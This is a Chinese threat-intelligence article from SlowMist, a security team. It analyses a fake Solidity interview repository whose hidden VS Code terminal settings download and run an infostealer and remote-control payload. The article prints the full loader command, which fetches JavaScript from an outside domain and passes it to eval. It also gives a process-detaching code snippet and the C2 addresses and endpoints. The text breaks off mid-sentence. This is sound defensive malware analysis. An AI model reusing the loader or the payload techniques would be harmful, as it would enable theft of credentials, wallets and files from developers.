---
title: 威胁情报｜警惕！Web3 面试题暗藏盗窃后门
url: https://mp.weixin.qq.com/s/LdgE0MHKgYR7x8KO77RnfA
source: Doonsec's feed
date: 2026-10-23
fetch_date: 2026-10-24T06:45:36.357964
---

# 威胁情报｜警惕！Web3 面试题暗藏盗窃后门

# 威胁情报｜警惕！Web3 面试题暗藏盗窃后门

原创

慢雾安全团队
慢雾安全团队

慢雾科技

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**********# 背景********

********#

慢雾(SlowMist) 安全团队近期收到用户反馈，GitHub 仓库 sol-live 以 Solidity 面试练习项目为名，README 列出 8 道题目，宣称每题预计耗时 5 至 10 分钟，降低使用者警惕。

经分析，项目在 VS Code 工作区设置文件 .vscode/settings.json 中嵌入了与合约练习无关的下载执行命令，并在命令前插入数百个空格，以降低其可见性。同时，配置通过文件排除规则隐藏 .vscode 目录。开发者使用项目定义的恶意终端配置启动终端后，可能触发远程脚本下载与执行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCJicTRMJWLIARzwf42DhTVSvlSo7P9Nenic4A60iaJwibPAIvDFjOL1jdArIEoYbgbSvCTWBiclLBSwSNSfrqaNibvnYOlHHRibiaMykEU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8z8bibAexaCKhEjk6lWwA5yPuq51CSH4cEZMV5pLH0HEY4vYoKFTIPnbhU6icibXOxjfaVfzPL8iaMNkklAnOYxG3viahf7HZEL7E62FoUmz2zN0/640?wx_fmt=png&from=appmsg)

在 macOS 和 Linux 的执行链路中，启动命令首先检查 Node.js 与 npm 环境，必要时安装 Node.js，随后写入并运行加载脚本。该脚本向固定地址发送请求，直接执行响应中的 JavaScript。本次获取的响应是一段约 4 MB 的混淆脚本。代码显示，该脚本可启动三个后台进程，分别负责浏览器数据窃取、文件扫描上传和远程控制，收集范围包括浏览器登录数据库、钱包扩展存储、macOS 钥匙串文件、本地文件及剪贴板内容。

本文分析基于归档源码、留存的 HTTP 响应及离线还原的脚本。分析过程中未执行恶意样本、未建立命令与控制(C2) 会话，也未访问分析主机的浏览器数据、钥匙串或剪贴板。下文描述的是代码逻辑及其具备的能力，不代表已在受害主机上观察到相应行为或结果。

# MistEye 响应********

********#

MistEye 是由慢雾(SlowMist) 自主研发的 Web3 威胁情报与动态安全监控系统，集成了安全监控与情报聚合能力，为用户提供实时的风险预警与资产守护。

MistEye 已第一时间通过情报推送与客户告警通道同步风险。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCJpdKu60d0O2xKhqicOt1009xkgmu83lmfveUV8rE1kk5umUOMuXLSzJf7jeRulqj1wjRiclvaq9Ic08ugQDYNYeZ2FrXdhk6Ybs/640?wx_fmt=png&from=appmsg)

#********

******# 入口：项目中的终端启动配置******

********#

VS Code 支持在工作区设置中定义终端配置，其中 path 指定启动程序，args 指定启动参数。sol-live 的设置文件同时包含字号、代码折叠和自动保存等常规选项，以及分别面向 macOS、Linux 和 Windows 的三套恶意终端配置。这些配置使用 zsh、bash 和 powershell 等常见名称，容易与正常终端配置混淆。

还原多层引号与转义后，Linux 的 bash 配置主要执行以下命令。macOS 对应命令还在 bash 前设置了 PROFILE=~/.zshrc。

```
{ node -v && npm -v; } || { curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash && . ~/.nvm/nvm.sh && nvm install --lts; } mkdir -p "~/.vscode/cache" && cd "~/.vscode/cache" && npm i axios && echo "require(\"axios\").post(\"https://www.enabledomain.app/api/ip-check-encrypted/3aeb34a36\").then(({data})=>eval(data))" > app.js && node app.js
```

外层命令使用 nohup、输出重定向和 &，使下载执行链路在后台运行，并抑制终端输出。若 node -v && npm -v 执行成功，则直接使用现有环境；否则通过 nvm-sh/nvm v0.40.3 官方安装器安装 nvm，再加载 ~/.nvm/nvm.sh 并安装 Node.js LTS 版本。

echo 将一行加载代码写入 app.js，随后由 node app.js 执行。加载代码调用 axios.post，未传入第二个参数，因此发送的是不携带请求体的 POST 请求。收到响应后，代码未校验响应内容，便将其交给 eval 动态执行。该执行链路以当前用户权限运行，无需管理员授权。

命令中的 "~/.vscode/cache" 使用了双引号，因此其中的 ~ 不会被 bash 或 zsh 展开为用户主目录，而会作为路径中的普通字符保留。实际目录位于终端启动时的工作目录下，即 ./~/.vscode/cache，通常对应项目根目录下的同名路径，app.js 也写入该目录。排查落地文件时，应根据终端的实际工作目录定位，避免仅检查用户主目录下的 .vscode/cache。

该项目未为 macOS 和 Linux 设置默认终端配置，需要用户主动选择并使用项目定义的 zsh 或 bash 配置启动终端，才会触发相应命令。Windows 配置则将 powershell 设为默认，并通过 Start-Process powershell -WindowStyle Hidden 启动隐藏窗口。不过，静态分析发现，相关 PowerShell 命令使用单引号字符串，反斜杠会被原样保留，可能导致写入 app.js 的 require(\"axios\") 无法作为合法 JavaScript 解析。该链路未在 Windows 上运行验证，能否完成远程代码执行仍未确认。

**需要指出的是，VS Code 工作区配置触发命令执行的方式并不唯一。本文分析的 sol-live 通过 .vscode/settings.json 中的终端启动配置触发命令，而慢雾创始人 Cos 此前公开的 vscode\_tasks\_command\_execute\_poc (https://github.com/evilcos/vscode\_tasks\_command\_execute\_poc) 则利用 .vscode/tasks.json 中的自动任务配置。两者在配置入口和触发条件上有所不同，具体如下：

|  |  |  |
| --- | --- | --- |
| 对比项 | sol-live | vscode\_tasks\_command\_execute\_poc |
| 配置入口 | .vscode/settings.json 中的终端启动配置 | .vscode/tasks.json 中的自动任务配置 |
| 触发条件 | macOS、Linux 需选择项目定义的 zsh／bash 配置并启动终端；Windows 设置了默认 PowerShell 配置，但执行有效性尚未确认 | 通过 runOn: folderOpen 关联文件夹打开事件，在自动任务获准运行时触发，无需手动打开终端 |**

此外，files.exclude 中的 \*\*/.vscode 规则会在 VS Code 文件树中隐藏 .vscode 目录。该规则不删除文件，也不影响 VS Code 读取工作区设置，但会降低恶意终端配置被用户发现的可能性。

# 第二阶段：混淆载荷与三个后台进程********

********#

对远程响应文本进行离线还原后，分析得到三个主要脚本，分别对应浏览器数据窃取模块、文件扫描上传模块和远程控制模块。此外，代码中还嵌入了一份用于重启文件扫描上传模块的脚本文本。

主程序首先检查 socket.io-client、sql.js、form-data 和 axios 四个 JavaScript 库，缺失时通过 npm 安装。随后，主程序使用当前 Node.js 可执行文件启动三个子进程，将各模块的脚本文本经标准输入传入。启动参数为 --max-old-space-size=4096 --no-warnings -，并结合 detached、windowsHide、输出丢弃和 unref()，使子进程脱离主程序继续运行并减少可见输出。以下为还原后的调用结构，变量名已作便于阅读的调整。

```
const child = spawn(process.execPath, ["--max-old-space-size=4096", "--no-warnings", "-"], {   detached: true,   windowsHide: true,   stdio: ["pipe", "ignore", "ignore"], }); child.stdin.end(scriptText); child.unref();
```

三个模块的脚本标识及进程记录文件对应如下：

|  |  |  |
| --- | --- | --- |
| 模块 | 脚本标识 | 进程记录文件 |
| 浏览器数据窃取 | ldbScript | pid.2.1.lock |
| 文件扫描上传 | autoUploadScript | pid.2.2.lock |
| 远程控制 | socketScript | pid.2.3.lock |

主程序将进程 ID 和启动时间写入系统临时目录中的上述文件，用于在重新启动模块前检查原进程是否仍在运行。当前分析的代码中未发现 macOS 开机自启服务、Windows 计划任务或 Linux 定时任务等系统启动机制。脱离父进程运行、记录进程信息及调用 unref() 本身不构成系统重启后的自动恢复机制；在已分析的 macOS 和 Linux 链路中，再次使用项目定义的恶意终端配置仍可重新触发执行。

# 浏览器、钱包扩展与 macOS 钥匙串********

********#

浏览器数据窃取模块首先生成 sysinfo.txt，记录主机名、操作系统、用户名、平台和时间。模块内置 13 种 Chromium 系浏览器的路径规则，包括 Chrome、Edge、Brave、Opera、Opera GX、Vivaldi、Yandex 和 Kiwi，并列出 Windows、macOS 和 Linux 的相关路径。在 WSL（Windows Subsystem for Linux）环境中，模块还会尝试访问 /mnt/c/Users/<用户名>/AppData/Local 下的 Windows 浏览器配置。

模块读取浏览器 Default 和 Profile\* 配置目录中的 Login Data、Login Data For Account 及 Web Data 数据库，以收集登录凭据和自动填充数据。同时，代码逐一检查 41 个硬编码扩展 ID 对应的 Local Extension Settings 目录，目标包括 MetaMask、Phantom、TronLink、Rabby 等常见钱包扩展的本地存储；Brave 的 Local Storage/leveldb 也在收集范围内。在 macOS 上，模块还会直接复制 ~/Library/Keychains/login.keychain-db。

需要区分数据收集与明文解密能力。当前版本的 decryptPassword() 在函数入口即执行 return ""，后续 AES-GCM 和 DPAPI 解密分支不可达，因此该函数不会在本机还原浏览器明文密码。

```
functiondecryptPassword(encryptedPassword, masterKey = null) {   return"";   // 后续 AES-GCM / DPAPI 分支不可达   // ... }
```

数据库查询仍会提取网址、用户名和加密后的密码值。由于解密结果为空，代码将加密值转换为 Base64 文本并写入 p\_encrypted 字段，还可能生成 s.txt 随文件一同上传。代码中另有获取浏览器密码加密主密钥的函数，涉及 Windows DPAPI、Linux 密钥存储和 macOS 的 security find-generic-password。其有效性取决于系统格式、运行权限及服务名，本文未进行运行验证。

钱包扩展的本地数据是否加密取决于各扩展的实现，复制对应目录不代表已经获得助记词或私钥，本文未验证这些数据能否解密。同样，获取 login.keychain-db 文件不等于取得其中的明文凭据；该文件仍受用户登录密码保护，后续能否解密还取决于攻击者是否获得相应密码或相关系统访问权限。

收集到的文件通过 form-data 构造表单，上传至 172[.]86[.]112[.]107:8085/upload。请求包含固定标记 userkey=206、t=2，以及主机名、时间戳和文件信息，并使用硬编码密钥 SuperStr0ngSecret@)@^2026! 计算 HMAC-SHA256 校验值。该校验用于验证请求是否来自持有相应密钥的一方，不提供内容加密；上传使用明文 HTTP，传输内容未受加密保护。该模块最多执行 11 个循环，循环间隔为 30 秒，每三个循环查询一次数据库。

# 文件扫描与上传********

********#

文件扫描上传模块在启动约 1 秒后开始扫描。代码注释标注为 “10 minutes”，但实际延迟参数对应 1 秒，应以代码参数为准。

模块优先扫描桌面、文档、下载、云盘、Projects、Development 和 Code 等目录。优先目录中的文件只要未被扩展名规则排除、大小不超过 5 MiB，即可进入上传队列，无需匹配敏感关键词。完成优先目录扫描后，模块再递归扫描用户主目录下的其他目录，此时文件路径需匹配 SENSITIVE\_FILE\_PATTERNS。该规则集涵盖助记词、私钥、钱包、.env、配置、数据库、文档和截图等关键词。在 Windows 上，扫描范围扩展至所有磁盘；在 WSL 环境中，/mnt 也被纳入优先扫描范围。

扫描器跳过 .ssh、.aws、.gnupg、.kube 和 .config 等目录，最大递归深度为 20 层。这些排除规则仅约束文件扫描上传模块，远程控制模块仍可读取当前运行权限允许访问的指定文件，不受该目录排除规则限制。

文件通过表单中的 file 字段上传至 172[.]86[.]112[.]107:8086/upload，请求同时包含原始路径、主机名、userkey=206 和 t=2。单个文件上限为 5 MiB，上传失败后最多重试两次，即总计最多尝试三次。

# 远程控制、文件读取与剪贴板********

********#

远程控制模块首先向 172[.]86[.]112[.]107:8087/api/notify 提交主机信息，成功后连接 ws://172[.]86[.]112[.]107:8087。连接建立约 1 秒后，模块在用户主目录中搜索 .env\* 文件，并将结果交由上传函数处理。

命令处理逻辑包含以下文件与目录操作：

* 102：列出目录及文件的基本信息。
* 107：读取指定路径的文件，通过 POST /api/upload-file 上传至 8085 端口。
* 108：上传指定目录下一层的文件，单个文件上限为 25 MiB。

通用命令执行分支则将服务器下发的命令交给 exec(command) 执行，并通过连接回传标准输出和标准错误。

该模块还提供交互式远程终端能力，通过打开、输入、调整窗口大小、关闭和断开等消息控制会话，并经 shellOutput 回传输出。代码根据操作系统尝试不同实现，包括 Node PTY（伪终端）、Python PTY、script、Windows 的 winpty/conhost 控制台工具及普通进程管道；必要时安装 @homebridge/node-pty-prebuilt-multiarch、node-pty-prebuilt-multiarch 或 node-pty。这些实现均来自已获取的响应代码，其跨平台运行效果未作验证。

远程控制模块中的剪贴板监控逻辑每秒读取一次剪贴板。Windows 上通过 PowerShell 调用 Windows Forms，macOS 使用 pbpaste，Linux 使用 xclip 或 xsel，WSL 则调用 PowerShell 读取 Windows 剪贴板。当内容非空且与上次读取结果不同时，模块将其作为 message 字段发送至 172[.]86[.]112[.]107:8087/api/log。

服务器还可通过 processControl 管理后台模块。start 使用嵌入的脚本文本重新启动文件扫描上传模块，未提供以同样方式重启浏览器数据窃取模块或远程控制模块的逻辑。stop 则根据 scriptType 读取对应进程记录文件并结束进程，覆盖上述三类模块。

```
const lockFileMap = {   ldbScript: path.join(os.tmpdir(), `pid.${2}.1.lock`),   autoUploadScript: path.join(os.tmpdir(), `pid.${2}.2.lock`),   socketScript: path.join(os.tmpdir(), `pid.${2}.3.lock`), };// stop: 按 scriptType 读取对应锁文件并 process.kill// start: 固定只重启 autoUploadScript sp_s(a_scr, "pid." + 2 + ".2.lock", "autoUploadScript");
```

# 关联项目********

********#

除...